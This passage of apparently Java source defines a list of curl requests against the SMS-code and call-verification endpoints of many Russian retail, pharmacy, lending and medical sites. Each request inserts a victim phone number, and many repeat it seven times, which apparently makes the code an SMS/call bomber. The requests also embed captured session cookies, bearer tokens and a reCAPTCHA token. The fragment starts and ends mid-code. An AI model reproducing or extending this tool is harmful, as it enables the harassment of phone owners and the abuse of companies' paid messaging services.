                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'aero=1&username=gerwgerge&login=%2B{full_phone}&password=gewrgegegewrgergergewrg' \\\n" +
                        "  --compressed"),

                new CurlService("curl 'https://www.parfum-lider.ru/local/ajax/auth/by_call.php' \\\n" +
                        "  -H 'authority: www.parfum-lider.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=eQB8jpeLyS402lDtE9mbSljNb2TE7SPR; parfumlider_GUEST_ID=42571405; parfumlider_LAST_VISIT=01.05.2023%2020%3A33%3A31; parfumlider_ALTASIB_GEOBASE_CODE=%7B%22REGION%22%3A%7B%22CODE%22%3A%2233%22%2C%22NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%22%2C%22FULL_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%9E%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22SOCR%22%3A%22%D0%BE%D0%B1%D0%BB%22%7D%2C%22DISTRICT%22%3A%7B%22CODE%22%3A%2233000%22%2C%22NAME%22%3A%22%22%2C%22SOCR%22%3A%22%22%7D%2C%22CITY%22%3A%7B%22ID%22%3A%2247740%22%2C%22NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22SOCR%22%3A%22%D0%B3%22%2C%22POSTINDEX%22%3A%220%22%2C%22ID_DISTRICT%22%3A%2233000%22%7D%2C%22CODE%22%3A%2233000005000%22%7D; parfumlider_currentStoreCity=33000005000; parfumlider_kernel=-crpt-kernel_0; _ym_uid=1674042020985718314; _ym_d=1682951614; _userGUID=0:lh4xxs3r:Tp3~ZIwa6FRYWFDxpPyyJrrEm7HwA4QD; dSesn=d03a9add-633c-b51b-e742-f09241523147; _dvs=0:lh4xxs3r:_o3CQQO~N8u~wVmeYsYewYCZ0IRh6KR~; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1682963940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; parfumlider_kernel_0=rqo098Jn65OcGOFsWhP2S_Oj5AfbjbjTncMDX_M6JxD8N4lTVtkUpfxpBMhG3fpc0EBkTyZ5MKBan3tE0Fv1JWsaqQln3s3KVg9lgNTl4q3-Ba18mlELCujOrFXhgsT7TiOOKqGI3NJBOS2YVtsVOluSen7lT0avV-QfKGY7cJ1axwEftBWJnS01RIeLKZdMxEi_5f-zv8pKFubnd0ZuZhbuPf1QGzH0iAJKeb7ckoNHmhHx34PQx0o5gEi8awqtdHTqSRJ3wmr731z0_rfB2IC-rmRcjilRjAKYw-6tVc3qfu6gpTBfL5pnzdkKgaQvyW0YFrQWa5dcg-7OFaIJ4b1KXskZCadqejFw3Kk3oeoYXuNUSlUltxYOBPR44MY_H8kNLz7WVWPXVzQIpMPf_CQclkZnh6TN9h2uxuJhQotE4WBA3iwIAGRhy5bEcEN2IPdpx2bnHK4PZndVRGRHcQ1AUcke7LrCbyI-bZ8S1Iu92XhYAMcqOSejHtgOz_V-aOYr8Qv06dqE9_tikhoxIix9-G04wje3d8F5hv2torMLl1hZO_cr2Z2Me4aBUmcrjEm1F5Ww0LFRh3i26RIUp7sfrOAMHCcczQyKaZ8CZAINv26rsPAoDMD4GhtjGYCemS3u1Xg_H-MUuJHuaA0UcRoaVRUaRhOSe6Ojdb8QuVLMxcm8U26z03CgOsswAEFyvCklF8nrVxoCi4QZ1ywe6wLCGu6MdK_QeB1DRt-BvTB7lkWyV2o0aTQlByAd2BW_X3u2rkwedoTa8_ZlYOFTcGERg0QDhd_pRHzRWkcg3-Jf_DSnemBMp3M5sXV6; uxs_uid=2754bab0-e82d-11ed-9dbc-75c7c6cc2b4f; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.1667994013.1682951616; _gid=GA1.2.171813107.1682951616; _gat=1; _gat_gtag_UA_8407288_3=1; _gcl_au=1.1.1731087898.1682951616; _dc_gtm_UA-184775945-1=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gat_frisbuyGa=1' \\\n" +
                        "  -H 'origin: https://www.parfum-lider.ru' \\\n" +
                        "  -H 'referer: https://www.parfum-lider.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone=%2B{formatted_phone:*+(***)+***-**-**}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://kviku.ru/cards/default/SendCodeApproveDocs' \\\n" +
                        "  -H 'authority: kviku.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: __ddgid_=QuxiFmvjT6F5LIPP; __ddgmark_=dnEsSdMKyfoJfg8v; __ddg5_=PuRUVC3m66hGDuTe; __ddg2_=6YlqkKfC9us3JJOv; __ddg3=b8vujzMEmR6C9Lw2; __ddg1_=JFjpHwDnXoYWzbWenBvx; PHPSESSID=qe2vlho56ig034s0dmm1l1nv02; ref_key=1; geo_country=RU; kid=6453d8e89848229eb7064ac60b6748d87727e5ef8f5ef636716fb49b8eb7bfaf3c23a9b36cf92b4470cec1f6ac3ca; _ym_uid=166124825777222614; _ym_d=1683216619; _ym_isad=2; _ym_visorc=w; _gid=GA1.2.1357022642.1683216619; pixel_sess_id=761b597b-3691-41c9-b99c-700063bb9635; pixel_user_fp=f24937e5c47dd4826c57c3f971f1cc59; pixel_user_dt=1683216619752; geo_country_popup=RU; _ga_F0ZPZ2R207=GS1.1.1683216618.1.1.1683216633.0.0.0; _ga=GA1.2.1858127879.1683216619' \\\n" +
                        "  -H 'origin: https://kviku.ru' \\\n" +
                        "  -H 'referer: https://kviku.ru/cash/default/index' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone=%2B{formatted_phone:*-***-***-****}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://hakasya.24farmacia.ru/api/login' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjliNTE0MzMxLTMzMGQtNDZhYi1iY2Y5LTE3YTY1MjAxMGE4NSIsInR5cGUiOiJhdXRob3JpemUiLCJpYXQiOjE2ODMyMTcwNDV9.XRxyWNvNWz7fr3QgoVynn1cEifpV8ubbSQSIU5s5drg' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'Origin: https://24farmacia.ru' \\\n" +
                        "  -H 'Referer: https://24farmacia.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
                        "  -H 'Type-Device: web' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'x-refresh-token;' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\",\"bitrixToken\":\"\"}' \\\n" +
                        "  --compressed"),

                new CurlService("curl 'https://7semyan.ru/local/ajax/auth.php?AJAX_REQUEST=Y' \\\n" +
                        "  -H 'authority: 7semyan.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'cache-control: no-cache' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: BITRIX_SM_GUEST_ID=27980350; _gcl_au=1.1.1619653539.1680708566; rrpvid=257308039619150; _ym_uid=1680708566507024937; _ym_d=1680708566; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; _ga=GA1.2.1984650142.1680708566; roistat_first_visit=15728909; tmr_lvid=0c07c408e108b2ede73f3f88588b427a; tmr_lvidTS=1680708566567; rraem=; ___dc=d80249ee-02eb-46b1-aff3-a50d7cc04815; PHPSESSID=ylbYyCU3RJ2g7gfwEJbOvCuR8yEFj57a; tinkoff_auth_state=u0TeKLwqYSzZfkCFtGb1; BITRIX_SM_ITEES_ASO_USER_DATA=a%3A2%3A%7Bs%3A13%3A%22SEARCH_ENGINE%22%3Bs%3A6%3A%22Google%22%3Bs%3A7%3A%22REFERER%22%3Bs%3A23%3A%22https%3A%2F%2Fwww.google.com%2F%22%3B%7D; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID=df42256bc5ea6737b3b1d26dec24226f; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A21%2C%22EXPIRE%22%3A1683233940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.990937281.1683217778; _gat_gtag_UA_111545587_1=1; _ym_visorc=w; _ym_isad=2; cto_bundle=0gMSzV9CdXE1aDRSNjA0SmklMkY4dnlrOENrRmphREhRNW8wUEdnTUNReCUyRlpMckNsMUpaRlhxSGF4SHFsQkp3Vm5DV3lJJTJCZnBzVjltUVluVGh6Q2c4Sjc5UndaeUhMUE1SRllWb2hWNXk2MHdpdlBaeSUyQjIlMkI5T3pjTSUyRnJkOWZiNCUyRkdNQVAlMkI; _gr_session=%7B%22s_id%22%3A%22fdeac820-aaf1-4f32-a406-e6297cd7fde6%22%2C%22s_time%22%3A1683217777776%7D; roistat_visit=16013595; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; g4c_x=1; BITRIX_SM_LAST_VISIT=04.05.2023%2019%3A29%3A37; roistat_marker=seo_google_; roistat_marker_old=seo_google_; rrwpswu=true; tmr_detect=0%7C1683217780612; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=%5B%5D; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old%2Croistat_call_tracking%2Croistat_emailtracking_email%2Croistat_emailtracking_tracking_email%2Croistat_emailtracking_emails' \\\n" +
                        "  -H 'origin: https://7semyan.ru' \\\n" +
                        "  -H 'referer: https://7semyan.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw '{\"action\":\"sendCall\",\"phone\":\"+{phone:7 ***-***-**-**}\",\"fingerprint\":\"1f77b5b2252086ad7056a973408429b0\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.petshop.ru/ajax/?act=AuthForm.SendCode' \\\n" +
                        "  -H 'authority: www.petshop.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: route=25d6ed6d94b4bfa9755de8688d30eaa5; PHPSESSID=022013409834f2f519690fccb5aa34b7; geo_city_id=a%3A1%3A%7Bs%3A7%3A%22city_id%22%3Bi%3A22%3B%7D; BITRIX_SM_SALE_UID=1305774718; _gid=GA1.2.1845568686.1683218180; _gat=1; tmr_lvid=4705f6bbc1b20e20c909a3057dbf6d0a; tmr_lvidTS=1683218179843; rrpvid=378369852167900; flocktory-uuid=d5b1dbba-0270-432b-aa75-866c61eff023-1; _ym_uid=168321818023239709; _ym_d=1683218180; showEcoSystem=true; _userGUID=0:lh9cn8jf:kT2trJTqE1mfvf~xZ0IA~o02SPprRE7X; dSesn=ce2bccb8-1766-5726-7b8c-96be33fdfad4; _dvs=0:lh9cn8jf:84YqvJXeV1AiwOuNXfddV~gsBsacYyYC; _ym_isad=2; rcuid=6275fcd65368be000135cd22; BITRIX_SM_SALE_UID=1305774718; _gat_EnhancedEcommerceTracker=1; _gcl_au=1.1.1279521930.1683218182; _gat_UA-46029315-1=1; _ga_C0DDR7MNM6=GS1.1.1683218182.1.0.1683218182.60.0.0; _ga=GA1.1.2056984546.1683218180; _tt_enable_cookie=1; _ttp=ifBFKBbQdA2lvaCjWZxJWQ-4Pvc; tmr_detect=0%7C1683218183077' \\\n" +
                        "  -H 'origin: https://www.petshop.ru' \\\n" +
                        "  -H 'referer: https://www.petshop.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw '{\"token\":\"b6ee70efc2062d935049e0a738f65f0c\",\"is_ajax\":true,\"phone\":\"+{full_phone}\",\"force\":false}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.tmktools.ru/api/user/send-code' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json; charset=UTF-8' \\\n" +
                        "  -H 'Cookie: city_id=4; BSSESSID=0b36a164-823f-4da0-b719-e566ae989daf; S5SESSID=njfvnv9q86g8g2f31dfrsjmifn; nlhid=1683218536590.34qmy89-tmk-h; nlsid=1683218536590.3av0elur-tmk-s; nluid=1683218536591.mmg4osbb-tmk-u; _gid=GA1.2.1341268179.1683218537; _dc_gtm_UA-5073072-1=1; _ga_57K8BDR49W=GS1.1.1683218536.1.0.1683218536.0.0.0; _ga=GA1.1.681569834.1683218537; _ga_P2LJ8HZZ0P=GS1.1.1683218536.1.0.1683218536.0.0.0; tmr_lvid=165b3c36b951a4e98c05b3e5c417b33f; tmr_lvidTS=1683218536919; _ym_uid=1683218537130480183; _ym_d=1683218537; _ym_isad=2; _ym_visorc=w; _gcl_au=1.1.883793766.1683218538; tmr_detect=0%7C1683218539283' \\\n" +
                        "  -H 'Origin: https://www.tmktools.ru' \\\n" +
                        "  -H 'Referer: https://www.tmktools.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\",\"recaptcha\":null}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://ap.leomax.ru/siteapi/auth/authcode' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmNmI2ZDU1My01MGQwLTQyMzItOWZlZS1mYWE3Yjg4MTU5MzIiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiODQxNzQ5OGItM2RlOS00ZWYxLWE1OTQtODM0NzlkNmRmOTU4IiwiZGV2aWNlaWQiOiJiMzQzNzFmZmRlZmJmYzM4OTFlYWIyZDU0YjAyMjNmYyIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2ODMyMjU0NjIsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.ZNmhsEK77LU-5MsGizOyE1wedqszPZjfZ-iWTLUD1X8' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Cookie: __ddg1_=qO4XZHQDxHvjRPmZFhmv; _ga_JL7GJBGZYH=GS1.1.1683218262.1.0.1683218262.60.0.0; _ym_uid=168321826321248194; _ym_d=1683218263; _ga=GA1.2.1496860973.1683218263; _gid=GA1.2.1041811607.1683218263; _gat_UA-55318952-1=1; _gat_UA-56721552-1=1; _ym_isad=2; _ym_visorc=b; call_s=%3C\\u0021%3E%7B%22qo1q7a6x%22%3A%5B1683220062%2C1826528831%2C%7B%22258661%22%3A%22782951%22%7D%5D%2C%22d%22%3A2%7D%3C\\u0021%3E; deviceId=b34371ffdefbfc3891eab2d54b0223fc; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmNmI2ZDU1My01MGQwLTQyMzItOWZlZS1mYWE3Yjg4MTU5MzIiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiODQxNzQ5OGItM2RlOS00ZWYxLWE1OTQtODM0NzlkNmRmOTU4IiwiZGV2aWNlaWQiOiJiMzQzNzFmZmRlZmJmYzM4OTFlYWIyZDU0YjAyMjNmYyIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2ODMyMjU0NjIsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.ZNmhsEK77LU-5MsGizOyE1wedqszPZjfZ-iWTLUD1X8; tmr_lvid=86bb6faf31d9a8c3346c87984efa5dd8; tmr_lvidTS=1683218263860; advcake_track_id=2d786c2d-5714-81c9-d168-3e8dd2730508; advcake_session_id=da4646da-1566-0778-20b5-3f6680a85cbf; amp_ff4b07=54yGiyOlbsdG4QYzDJZTlG...1gvjq0s0n.1gvjq0s0q.1.0.1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; adrdel=1; adrcid=AoperZLPuANMfaxNNExWeOA; analytic_id=1683218266303917' \\\n" +
                        "  -H 'Origin: https://auth.leomax.ru' \\\n" +
                        "  -H 'Referer: https://auth.leomax.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://mid-new-prod.doctis.ru/api/v2/Account/StartRegister' \\\n" +
                        "  -H 'authority: mid-new-prod.doctis.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://lk.mamadeti.ru' \\\n" +
                        "  -H 'referer: https://lk.mamadeti.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: cross-site' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone:+7 *** ***-**-**}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.sportdepo.ru/auth/?login=yes&ajax=Y' \\\n" +
                        "  -H 'authority: www.sportdepo.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=JGY41Koc4F6vDeRbkjfUc9lzWaNCMOd1; BITRIX_SM_GUEST_ID=5392875; BITRIX_SM_LAST_ADV=5_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A9%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1683455687159745799; _ym_d=1683455687; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; BITRIX_SM_LAST_VISIT=07.05.2023+13%3A34%3A48' \\\n" +
                        "  -H 'origin: https://www.sportdepo.ru' \\\n" +
                        "  -H 'referer: https://www.sportdepo.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'AUTH_FORM_SMS=Y&AUTH_FORM_SMS_ACTION=send&backurl=%2Fauth%2F&USER_PHONE=%2B{phone:7+(***)+***-**-**}&AUTH_SMS_CODE=' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://lk.restamanagement.ru/api/auth/register' \\\n" +
                        "  -H 'Accept: application/json' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Cookie: _ga_FQ1TPWMWQK=GS1.1.1683456068.1.0.1683456068.0.0.0; _ga=GA1.2.1244155059.1683456069; _gid=GA1.2.327998884.1683456069; _gat_gtag_UA_119464362_15=1; _ym_uid=168345607076911489; _ym_d=1683456070; _ym_isad=2; _ym_visorc=w' \\\n" +
                        "  -H 'Origin: https://lk.restamanagement.ru' \\\n" +
                        "  -H 'Referer: https://lk.restamanagement.ru/registration' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"id\":\"\",\"phone\":\"+{phone:7 (***) *** ** **}\",\"password\":\"qwertyuiop\",\"passwordConfirm\":\"qwertyuiop\",\"sender\":4,\"remember\":true,\"agreement\":true,\"reCAPTCHA\":\"03AL8dmw8IGwThScmZ1QEBalHC49hVFWUgtAtquBPGT3WOyplmBmOJn_alRGPTBXCKdRvVFsPsciLfFz4UdwJ8yYyiqTxdUH02y1CX1iqKJA3MTC7u-iY7j27XGu9fIoTZ_CQV3HIabxgJJskOWETskViC4GsQlyE9H5r4ORMuY2hBCoYO5Q0XkbZ6CrA-DIPI6dLAtm-pQyHXsFfslqF4zm-zexi1mjgq5NuCvqa9KiQX_iLUtrIe2DYi3hgYw81mQ4cjbyGt0ZQr8eDGJY7P3Chcv3PefsMFCVIlT-BhGSlqrhYKFI-gzEhqqa86WDu-EXmO8VE09J3T12YlUUD-nvuufyewYHF9FnCxIiJ6IE1nsa7pFNz1qX_L54eVL-2nNMjDT0Vh_yzvMJGppwVo-06F95wc1onmrpZXmLGwiJRp7xECvCRamVaU2_cLo9EJiNL1S5RXlXXN9fds6pda4dDfLIKfCzMCovKY8BqUYd73U1Mv7qviL4DvGIoHtbu0EWF4zwlfuZkEP4ky9scRI1TGPOnR6VTAcUugBUw_ei7aV9IJqGDkerU\",\"connectionId\":\"KevNkdDkmSbBC9wDqfavnA\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://xn----8sbpjmk6aq9b.xn--p1ai/checkPhone' \\\n" +
                        "  -H 'authority: xn----8sbpjmk6aq9b.xn--p1ai' \\\n" +
                        "  -H 'accept: application/json' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'authorization: bearer null' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: sushimake_session=eyJpdiI6IkVSd2JkcEdYWnU1ZnF6NTltSjBRMEE9PSIsInZhbHVlIjoib0t6WjVVb09ra05DVHRONmJSRzdqb0lHeWlBYzZXaFV0K1gvcEFqbUJqaVBsWWlQeUZVZmI2YVhkaHZBNWwyS3NaQ01EZmxiMjU4SW1yVHUyajNjT1dkRlVtNnBUUy9WT2MveHRtS1h6NjEzTEE4dktiNU8rQ0JIaXpIaGlTSWwiLCJtYWMiOiIyNDFhZTg1YzIzMDQ2MzBmYzAzODZhYjc4YTQ0NGVmZjFmYjAzYzA4MDJmMjU2MzE0NTRjYzVhMjA5NjY3MjVkIn0%3D; 